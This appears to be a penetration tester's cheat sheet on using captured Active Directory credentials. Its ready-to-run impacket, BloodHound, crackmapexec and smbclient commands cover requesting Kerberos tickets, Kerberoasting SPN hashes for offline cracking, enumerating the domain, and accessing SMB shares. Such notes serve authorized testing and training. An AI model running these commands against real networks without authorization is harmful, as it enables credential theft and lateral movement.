# Got Credentials
## Kerberos Ticket
Uses a valid user's NTLM hash to request Kerberos tickets in order to access any service or machine where the user has permissions. Impacket tools can be used with Kerberos Tickets with `-k -no-pass`.
```bash
impacket-getTGT domain.local/username:password

export KRB5CCNAME=username.ccache
```

## Kerberoasting
Attempt to fetch Service Principal Names (SPN) that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password which can then be brute forced offline.
```bash
impacket-GetUserSPNs -request domain.local/username:password -dc-ip domain.local -outputfile hashes.kerbroast
```

Got Hash: [Next](cracking-hashes.md#spn)

## BloodHound
Python based injector for BloodHound to remotely collect data for BloodHound by querying LDAP.
```bash
bloodhound-python -c All -u username -p 'password' -d domain.local -dc domain.local -ns 10.10.10.10
```

Got Data: [Here](bloodhound.md)

## SMB
Test credentials against SMB and list any shares they have permissions to read or write to.
```bash
crackmapexec smb 10.10.10.10 -u username -p password --shares
```

Use credentials to access SMB shares the user has permissions to.
```bash
smbclient -U 'domain.local/username%password' //domain.local/share\$
```

